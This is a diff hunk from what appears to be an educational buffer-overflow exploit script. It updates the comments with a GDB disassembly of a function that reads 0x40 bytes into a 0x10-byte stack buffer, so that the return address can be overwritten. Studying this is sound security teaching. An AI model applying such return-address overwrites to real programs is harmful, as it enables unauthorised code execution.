@@ -29,22 +29,21 @@ if __name__ == '__main__':
     # https://docs.python.org/3/library/stdtypes.html#binary-sequence-types-bytes-bytearray-memoryview
     io.recvuntil(b"Enter the password to access Santa Ono's secret vault:")
 
-    # "disassemble main" in GDB launched with "gdb buffer_overflow"
-    # Dump of assembler code for function main:
-    #    0x00000000004011a3 <+0>:	endbr64
-    #    0x00000000004011a7 <+4>:	push   rbp
-    #    0x00000000004011a8 <+5>:	mov    rbp,rsp
-    #    0x00000000004011ab <+8>:	sub    rsp,0x10
-    #    0x00000000004011af <+12>:	lea    rdi,[rip+0xe6a]              # 0x402020
-    #    0x00000000004011b6 <+19>:	call   0x401060 <puts@plt>
-    #    0x00000000004011bb <+24>:	mov    rdx,QWORD PTR [rip+0x2e7e]   # 0x404040 <stdin@@GLIBC_2.2.5>
-    #    0x00000000004011c2 <+31>:	lea    rax,[rbp-0x10]
-    #    0x00000000004011c6 <+35>:	mov    esi,0x20
-    #    0x00000000004011cb <+40>:	mov    rdi,rax
-    #    0x00000000004011ce <+43>:	call   0x401070 <fgets@plt>
-    #    0x00000000004011d3 <+48>:	mov    eax,0x0
-    #    0x00000000004011d8 <+53>:	leave
-    #    0x00000000004011d9 <+54>:	ret    <-- returns to our injected address
+    # "disassemble get_password" in GDB launched with "gdb buffer_overflow"
+    # 0x00000000004011a3 <+0>:	endbr64 
+    # 0x00000000004011a7 <+4>:	push   rbp
+    # 0x00000000004011a8 <+5>:	mov    rbp,rsp
+    # 0x00000000004011ab <+8>:	sub    rsp,0x10
+    # 0x00000000004011af <+12>:	lea    rdi,[rip+0xe6a]              # 0x402020
+    # 0x00000000004011b6 <+19>:	call   0x401060 <puts@plt>
+    # 0x00000000004011bb <+24>:	mov    rdx,QWORD PTR [rip+0x2e7e]   # 0x404040 <stdin@@GLIBC_2.2.5>
+    # 0x00000000004011c2 <+31>:	lea    rax,[rbp-0x10]
+    # 0x00000000004011c6 <+35>:	mov    esi,0x40
+    # 0x00000000004011cb <+40>:	mov    rdi,rax
+    # 0x00000000004011ce <+43>:	call   0x401070 <fgets@plt>
+    # 0x00000000004011d3 <+48>:	nop
+    # 0x00000000004011d4 <+49>:	leave  
+    # 0x00000000004011d5 <+50>:	ret    <-- returns to our injected address
 
     # In assembly you can read "sub rsp,0x10" at the start of "main"
     # We need to write past 0x10 bytes to start modifying maliciously
